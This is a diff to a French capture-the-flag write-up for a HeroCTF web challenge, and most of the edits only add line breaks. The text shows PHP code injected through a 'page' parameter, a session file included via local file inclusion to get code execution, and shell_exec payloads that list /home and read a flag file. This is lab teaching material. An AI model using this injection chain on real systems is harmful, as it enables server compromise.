@@ -19,7 +19,7 @@ Worty
 
 ### Note aux lecteurs
 
-Github ne permet pas d'afficher du code PHP tel quel. Quand il y a une payload il faut évidemment mettre au début "<?php" et à la fin "?>" pour que celle-ci fonctionne.
+Github ne permet pas d'afficher du code PHP tel quel. Quand il y a une payload il faut évidemment mettre les balises PHP pour que celle-ci fonctionne.<br/>
 Ces balises ne seront donc pas présentes dans ce writeup mais doivent être présentes quand vous faites le challenge.
 
 ### Solution
@@ -40,18 +40,18 @@ Dans ce fichier, on remarque plusieurs choses :<br/>
 
 Nous allons donc utiliser cette option pour passer notre code PHP et arriver à notre but !
 
-Payload : http://challs.heroctf.fr:3005/index.php?page=phpinfo();, ici, le serveur nous répond que le fichier n'existe pas, forcément, puisque c'est du code PHP.
+Payload : http://challs.heroctf.fr:3005/index.php?page=phpinfo();, ici, le serveur nous répond que le fichier n'existe pas, forcément, puisque c'est du code PHP.<br/>
 On va donc maintenant accéder à notre session AVEC le paramètre page car on veut que notre code PHP soit exécuté.
 
-Payload :  http://challs.heroctf.fr:3005/index.php?page=./OhD4Sessions/sess_ID
+Payload :  http://challs.heroctf.fr:3005/index.php?page=./OhD4Sessions/sess_ID<br/>
 BOOM ! Notre code php est exécuté, nous avons donc notre RCE.
 
-Nous allons donc maintenant devoir lister le contenu du dossier /home, pour connaître le nom de l'utilisateur :
-Payload : http://challs.heroctf.fr:3005/index.php?page=var_dump(shell_exec("ls /home"));
+Nous allons donc maintenant devoir lister le contenu du dossier /home, pour connaître le nom de l'utilisateur :<br/>
+Payload : http://challs.heroctf.fr:3005/index.php?page=var_dump(shell_exec("ls /home"));<br/>
 On réaccède à notre session grâce à la LFI, et on remarque dans le dossier home l'utilisateur haxorhome.
 
-Nous allons donc maintenant récupérer le nom du fichier à récupérer :
-Payload : http://challs.heroctf.fr:3005/index.php?page=var_dump(shell_exec("ls /home/haxorhome"));
+Nous allons donc maintenant récupérer le nom du fichier à récupérer :<br/>
+Payload : http://challs.heroctf.fr:3005/index.php?page=var_dump(shell_exec("ls /home/haxorhome"));<br/>
 On réaccède à notre session grâce à la LFI, on remarque que le fichier se nomme flag.txt.
 
 Payload final : http://challs.heroctf.fr:3005/index.php?page=var_dump(shell_exec("cat /home/haxorhome/flag.txt")); , et on réaccède à notre session grâce à la LFI, flag !
